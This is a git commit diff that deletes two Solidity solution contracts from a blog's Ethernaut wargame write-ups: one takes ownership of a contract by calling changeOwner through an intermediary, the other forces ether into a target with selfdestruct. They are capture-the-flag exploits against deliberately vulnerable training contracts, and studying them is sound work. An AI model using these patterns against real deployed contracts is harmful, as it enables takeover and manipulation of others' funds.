41e034044902460ea91e6a20784e9155534ce252
Sud0u53r <akashak00011@gmail.com>
2025-02-21 12:36:50 +0530

    ..

--- public/en/posts/ethernaut-challenges/files/solution_contracts/4_telephone_attack.sol
+++
@@ -1,9 +0,0 @@
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
-
-contract TelephoneAttack {
-  function attack(address _contract) public returns (bool) {
-    (bool success, ) = _contract.call(abi.encodeWithSignature("changeOwner(address)", msg.sender));
-    return success;
-  }
-}
--- public/en/posts/ethernaut-challenges/files/solution_contracts/7_force_attack.sol
+++
@@ -1,9 +0,0 @@
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.6.0;
-
-contract ForceAttack {
-    constructor () public payable {}
-    function attack(address payable _contract) public {
-        selfdestruct(_contract);
-    }
-}
